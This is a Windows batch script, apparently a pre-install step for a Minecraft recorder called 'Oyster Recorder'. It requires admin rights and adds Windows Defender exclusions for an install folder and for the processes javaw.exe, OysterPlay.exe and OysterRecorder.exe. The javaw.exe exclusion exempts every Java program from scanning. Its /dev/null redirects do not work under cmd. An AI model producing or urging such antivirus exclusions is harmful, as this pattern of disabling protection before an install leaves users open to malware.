@echo off
chcp 65001 >/dev/null
title Oyster Recorder - 安装前 Defender 排除配置
color 0B
echo.
echo ============================================================
echo   Oyster Recorder - 安装前必跑脚本
echo ============================================================
echo.
echo   此脚本会把 OysterRecorder 的安装目录加入 Windows
echo   Defender 的排除列表，避免 Defender 误删我们打包的
echo   Java 运行时 (javaw.exe) 和 Minecraft 游戏文件。
echo.
echo   排除路径: %%LOCALAPPDATA%%\OysterRecorder
echo.
echo ============================================================
echo.

net session >/dev/null 2>&1
if %errorlevel% neq 0 (
    echo [错误] 此脚本需要管理员权限运行。
    echo.
    echo        请右键此文件 → 选择 "以管理员身份运行"
    echo.
    pause
    exit /b 1
)

echo [1/3] 添加文件夹排除...
powershell -NoProfile -Command "Add-MpPreference -ExclusionPath '%LOCALAPPDATA%\OysterRecorder' -ErrorAction SilentlyContinue"
echo       完成

echo.
echo [2/3] 添加进程排除 (javaw + OysterPlay + OysterRecorder)...
powershell -NoProfile -Command "Add-MpPreference -ExclusionProcess 'javaw.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'OysterPlay.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'OysterRecorder.exe' -ErrorAction SilentlyContinue"
echo       完成

echo.
echo [3/3] 验证...
powershell -NoProfile -Command "$ex = Get-MpPreference; if ($ex.ExclusionPath -contains '%LOCALAPPDATA%\OysterRecorder') { Write-Host '      OK 文件夹排除已生效' -ForegroundColor Green } else { Write-Host '      警告: 排除项可能未生效，请检查 Defender 是否被组策略禁用' -ForegroundColor Yellow }"

echo.
echo ============================================================
echo   完成! 现在可以双击 OysterRecorder-Setup-*.exe 安装了。
echo ============================================================
echo.
pause
